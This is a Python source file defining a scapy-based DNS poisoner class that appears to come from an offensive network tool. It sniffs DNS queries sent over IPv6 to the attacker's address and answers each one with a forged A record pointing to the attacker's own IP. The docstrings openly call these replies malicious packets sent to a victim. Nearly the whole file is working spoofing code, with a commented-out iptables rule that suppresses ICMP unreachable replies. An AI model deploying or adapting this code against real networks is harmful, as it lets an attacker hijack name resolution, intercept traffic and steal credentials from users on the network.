import os
from typing import Tuple
from scapy.all import (
    DNSRR,
    DNSQR,
    DNS,
    Ether,
    IP,
    UDP,
    sendp,
    sniff,
    packet,
    IPv6,
)
from loguru import logger
from threading import Thread
from colorama import Fore, Style
from .poisonnetwork import PoisonNetwork


class DNSPoison(PoisonNetwork):
    """[ DNS poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        ipv6: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        level: str = "INFO",
    ):
        super().__init__(ip, ipv6, mac_address, iface, info_logger, level)

    def __dns_resource_record(self, pkt: packet) -> DNSRR:
        """[ Function to configure dns record for the response ]

        Args:
            pkt (packet): [ sniffed package ]

        Returns:
            DNSRR: [ DNS record ]
        """

        return DNSRR(
            rrname=pkt[DNS].qd.qname,
            type="A",
            rclass="IN",
            ttl=100,
            rdlen=None,
            rdata=self.ip,
        )

    def __transport_layer(self, response: packet, pkt: packet) -> packet:
        """[ Method to create the transport layer of the response packet ]

        Args:
            pkt (packet): [ sniffed packet ]
            response (packet): [ Malicious packet ]
        Returns:
            packet: [Returns the packet modified packet]

        """
        response /= UDP(sport=53, dport=pkt[UDP].sport)
        return response

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Method to create the application layer of the response packet]
        Args:
            pkt (packet): [ sniffed packet ]
            response (packet): [ Malicious packet ]
        Returns:
            packet: [Returns the packet modified packet]


        """
        response /= DNS(
            id=pkt[DNS].id,
            qr=1,
            opcode="QUERY",
            rcode="ok",
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=pkt[DNS].qd,
            an=self.__dns_resource_record(pkt),
            ns=None,
            ar=None,
        )
        return response

    def __send_packet(
        self, response: packet, ip_of_the_packet: str, resource: str
    ) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.info_logger.debug("Packet crafted: ")
        self.info_logger.debug(response.summary())
        # if ip_of_the_packet not in self.targets_used:
        self.info_logger.log(
            self.logger_level,
            f"{Fore.CYAN}(DNS) Sending packet to {ip_of_the_packet} responding {resource}{Style.RESET_ALL}",
        )
        sendp(response, verbose=False)
        # self.targets_used.append(ip_of_the_packet)

    def __filter_for_dns(self, pkt: packet) -> bool:
        """[ Filter by sniffed packets of interest ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            bool: [ If the packet is asking for a resource ]
        """
        return (
            pkt.haslayer(IPv6)
            and pkt[IPv6].src != self.ipv6
            and pkt[IPv6].dst == self.ipv6
            and pkt[DNS].qd is not None
        )

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if self.__filter_for_dns(pkt):
            response = self._data_link_layer(pkt)
            response, ip_of_the_packet = self._network_layer(pkt, response)
            response = self.__transport_layer(response, pkt)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet, pkt[DNS].qd.qname)

    def start_dns_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.info_logger.log(self.logger_level, "Starting dns poisoning...")
        # self._start_cleaner()
        # os.system("iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
        sniff(
            filter="udp and port 53",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )
